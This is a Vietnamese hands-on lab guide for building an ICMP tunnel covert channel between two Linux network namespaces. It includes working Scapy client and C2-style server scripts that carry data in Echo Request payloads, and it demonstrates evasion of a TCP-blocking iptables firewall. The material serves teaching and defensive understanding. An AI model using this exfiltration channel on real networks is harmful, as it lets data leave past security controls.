# HƯỚNG DẪN THỰC HÀNH: LAB 03
## ICMP Tunneling (Covert Channel & Data Exfiltration)

---

### 1. MỤC TIÊU & MÔ HÌNH MẠNG
- **Mục tiêu:** Tạo kênh truyền ngầm tuồn dữ liệu (Covert Channel) qua trường payload của gói tin ICMP Echo Request (`Type 8`), nhận gói phản hồi xác nhận (`Type 0`), và chứng minh khả năng vượt qua tường lửa L4 chặn toàn bộ TCP/UDP ports.
- **Topology:**
  - `h1`: `10.0.0.1/24` (Client nội bộ / Kẻ tuồn dữ liệu) trên `veth1`
  - `h2`: `10.0.0.2/24` (Server ngoài / C2 Server) trên `veth2`

---

### 2. BƯỚC 1: KHỞI TẠO THƯ MỤC VÀ TẠO CÁC SCRIPT

Tạo thư mục `/tmp/lab03` và tạo 3 script bằng `cat << 'EOF'` (hoặc dùng `nano <tên_file>` để soạn thảo):

```bash
mkdir -p /tmp/lab03 && cd /tmp/lab03

# 1. Script thiết lập mạng: setup_pair.sh
cat << 'EOF' > /tmp/lab03/setup_pair.sh
#!/usr/bin/env bash
set -e

echo "[*] Dọn dẹp namespace cũ..."
ip netns del h1 2>/dev/null || true
ip netns del h2 2>/dev/null || true

echo "[*] Tạo 2 namespace h1 (Client) và h2 (Server)..."
ip netns add h1
ip netns add h2

echo "[*] Tạo veth pair nối h1 và h2..."
ip link add veth1 type veth peer name veth2
ip link set veth1 netns h1
ip link set veth2 netns h2

echo "[*] Cấu hình địa chỉ IP..."
ip netns exec h1 ip link set dev lo up
ip netns exec h1 ip addr add 10.0.0.1/24 dev veth1
ip netns exec h1 ip link set dev veth1 up

ip netns exec h2 ip link set dev lo up
ip netns exec h2 ip addr add 10.0.0.2/24 dev veth2
ip netns exec h2 ip link set dev veth2 up

# Vô hiệu hóa tính năng tự động phản hồi ICMP của Kernel trên h2
# để nhường quyền xử lý hoàn toàn cho Scapy Server ở tầng ứng dụng
ip netns exec h2 sysctl -w net.ipv4.icmp_echo_ignore_all=1

echo "[+] Setup hoàn tất! Kiểm tra ping cơ bản:"
ip netns exec h1 ping -c 1 -W 1 10.0.0.2 || echo "[+] Kernel h2 đã bỏ qua ping tự động (đúng như kỳ vọng)"
EOF
chmod +x /tmp/lab03/setup_pair.sh

# 2. Script máy chủ lắng nghe kênh ngầm: icmp_server.py
cat << 'EOF' > /tmp/lab03/icmp_server.py
#!/usr/bin/env python3
import sys
from scapy.all import sniff, IP, ICMP, Raw, send

IFACE = "veth2"
print(f"[*] ICMP Tunnel Server đang lắng nghe trên {IFACE}...")

def handle_packet(pkt):
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8: # Echo Request
        client_ip = pkt[IP].src
        server_ip = pkt[IP].dst
        icmp_id = pkt[ICMP].id
        icmp_seq = pkt[ICMP].seq
        
        payload = b""
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load
            
        print(f"[+] Nhận dữ liệu ngầm từ {client_ip}: {payload}")
        
        # Gửi lại gói Echo Reply (Type 0) mang thông điệp xác nhận ACK
        ack_payload = b"ACK:" + payload
        reply = IP(src=server_ip, dst=client_ip) / ICMP(type=0, id=icmp_id, seq=icmp_seq) / Raw(load=ack_payload)
        send(reply, iface=IFACE, verbose=0)
        print(f"[+] Đã phản hồi ACK tới {client_ip}")

sniff(iface=IFACE, filter="icmp", prn=handle_packet, store=0)
EOF

# 3. Script máy trạm tuồn dữ liệu: icmp_client.py
cat << 'EOF' > /tmp/lab03/icmp_client.py
#!/usr/bin/env python3
import sys
from scapy.all import IP, ICMP, Raw, sr1

SERVER_IP = "10.0.0.2"
IFACE = "veth1"
SECRET_DATA = b"tainbow"

print(f"[*] Đang gửi dữ liệu bí mật tới {SERVER_IP} qua kênh ngầm ICMP...")
req = IP(dst=SERVER_IP) / ICMP(type=8, id=0x1337, seq=1) / Raw(load=SECRET_DATA)

# Gửi request và chờ nhận response trong 3 giây
ans = sr1(req, iface=IFACE, timeout=3, verbose=0)

if ans:
    reply_data = ans[Raw].load if ans.haslayer(Raw) else b""
    print(f"[+] Nhận thành công phản hồi từ Server: {reply_data}")
else:
    print("[-] Hết thời gian chờ (Timeout), không nhận được phản hồi.")
EOF
```

---

### 3. BƯỚC 2: CHẠY THIẾT LẬP MẠNG

```bash
sudo bash /tmp/lab03/setup_pair.sh
```

---

### 4. BƯỚC 3: KHỞI CHẠY KÊNH TRUYỀN NGẦM ICMP

1. Khởi chạy Server trong background trên `h2`:
   ```bash
   sudo ip netns exec h2 python3 /tmp/lab03/icmp_server.py > /tmp/lab03/server.log 2>&1 &
   SERVER_PID=$!
   sleep 1
   ```
2. Mở `tcpdump` trên `h2` với cờ `-A` để bắt và đọc rõ payload ASCII:
   ```bash
   sudo ip netns exec h2 timeout 6 tcpdump -i veth2 -nn -A icmp > /tmp/lab03/tcpdump_payload.log 2>&1 &
   sleep 1
   ```
3. Chạy Client trên `h1` để tuồn chuỗi dữ liệu `tainbow`:
   ```bash
   sudo ip netns exec h1 python3 /tmp/lab03/icmp_client.py
   sleep 2
   ```

---

### 5. BƯỚC 4: KIỂM CHỨNG KẾT QUẢ DỮ LIỆU TUỒN

1. Xem nhật ký Server:
   ```bash
   cat /tmp/lab03/server.log
   ```
   *Kỳ vọng:* Hiển thị `[+] Nhận dữ liệu ngầm từ 10.0.0.1: b'tainbow'`.

2. Xem log bắt gói `tcpdump` đọc rõ cleartext ASCII:
   ```bash
   cat /tmp/lab03/tcpdump_payload.log
   ```
   *Kỳ vọng:* Xuất hiện rõ chuỗi `tainbow` và chuỗi phản hồi `ACK:tainbow`.

---

### 6. BƯỚC 5: KIỂM CHỨNG VƯỢT TƯỜNG LỬA TẦNG 4 (FIREWALL EVASION)

1. Thiết lập luật iptables trên `h2` chặn toàn bộ lưu lượng TCP:
   ```bash
   sudo ip netns exec h2 iptables -A INPUT -p tcp -j DROP
   ```
2. Kiểm tra kết nối TCP thông thường bằng `nc`:
   ```bash
   sudo ip netns exec h1 nc -zvw 2 10.0.0.2 80 || echo "[+] TCP bị chặn đúng như kỳ vọng!"
   ```
   *Kỳ vọng:* Kết nối TCP bị timeout (mã thoát 1).

3. Kiểm tra lại kênh truyền ngầm ICMP:
   ```bash
   sudo ip netns exec h1 python3 /tmp/lab03/icmp_client.py
   ```
   *Kỳ vọng:* Dữ liệu ICMP vẫn truyền nhận thông suốt, chứng minh kênh ngầm ICMP vượt qua được tường lửa L4 chỉ lọc cổng TCP/UDP.

---

### 7. BƯỚC 6: DỌN DẸP MÔI TRƯỜNG

```bash
sudo pkill -f icmp_server.py 2>/dev/null || true
sudo ip netns exec h2 iptables -F 2>/dev/null || true
sudo ip netns del h1 2>/dev/null || true
sudo ip netns del h2 2>/dev/null || true
sudo rm -rf /tmp/lab03
```
